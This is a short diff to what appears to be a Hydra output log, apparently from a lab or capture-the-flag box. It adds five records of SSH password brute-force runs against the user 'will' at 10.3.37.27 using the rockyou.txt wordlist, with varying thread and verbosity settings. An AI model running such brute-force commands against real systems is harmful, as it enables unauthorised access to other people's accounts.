@@ -30,3 +30,8 @@
 [5900][vnc] host: 10.3.37.27   password:  
 # Hydra v9.3 run at 2022-03-09 08:15:42 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -o output.txt ssh://10.3.37.27)
 # Hydra v9.3 run at 2022-03-09 08:16:05 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -t 64 -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:16:51 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -t 50 -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:17:02 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:17:15 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:17:53 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -V -I -o output.txt ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-09 08:18:06 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -v -I -o output.txt ssh://10.3.37.27)
